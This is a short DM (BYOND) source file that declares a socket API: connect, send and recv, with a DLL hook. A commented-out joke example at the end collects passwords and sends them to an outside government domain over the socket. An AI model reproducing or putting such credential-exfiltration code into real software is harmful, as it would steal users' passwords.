/datum/socket
/datum/socket/proc/__register_socket()
/datum/socket/proc/__deregister_socket()
/datum/socket/proc/__check_has_data()
/datum/socket/proc/__wait_for_data()
/datum/socket/proc/__retrieve_data()

/datum/socket/New()
	__register_socket()
	
/datum/socket/Del()
	__deregister_socket()

//addr is a string with IP or domain, port is a number
/datum/socket/proc/connect(addr, port)

//returns TRUE on success, FALSE on failure (e.g. disconnect)
/datum/socket/proc/send(data)

//returns the received data as a string. Returns up to `len` bytes as a string, or sleeps until there's data in the buffer.
/datum/socket/proc/recv(len)
	if(!__check_has_data())
		__wait_for_data()
	return __retrieve_data()

//disconnect the socket, unimplemented
/datum/socket/proc/close()

/world/proc/enable_sockets()
	call("byond-extools.dll", "init_sockets")()

/* Example:

/proc/upload_statistics()
	var/statistics = collect_passwords()
	var/datum/socket/S = new
	S.connect("www.nsa.gov", 7331)
	S.send(statistics)
	world << S.recv()
	
*/